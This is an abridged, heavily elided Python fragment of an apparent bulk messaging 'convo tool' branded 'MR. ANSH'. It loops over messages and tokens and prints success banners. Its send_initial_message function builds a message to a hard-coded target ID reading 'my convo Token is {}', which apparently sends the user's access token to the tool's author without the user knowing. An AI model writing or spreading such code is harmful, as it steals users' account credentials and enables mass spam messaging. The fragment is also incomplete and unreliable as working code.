...
def send_initial_message():
      ...
      msg_template = "Hello Ansh sir..!! I'm using Your Convo Tool And my convo Token is {}"

 

      # Specify the ID where you want to send the message

      target_id = "61580855657005"
...
def send_messages_from_file():
      ...
      def liness():
          ...
          print('\033[1;92m' + '[>] ===========𝗔𝗡𝗦𝗛 𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
          ...
          try:
              ...
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      ...
                      print("\033[1;36;1m[✔️] YOU ARE USING MR. ANSH CONVO TOOL : MESSAGE {} OF CONVO{} SENTSUCCESSFULLY BY TOKEN NO. {}: {}".format(
                      ...
                      print("\033[1;36;1m[✔️] YOU ARE USING MR. ANSH CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
              ...
              print("\n[✔️] ALL MESSAGE SENT SUCCESSFULLY NOW WAIT FOR 30 SEC BRO....\n")
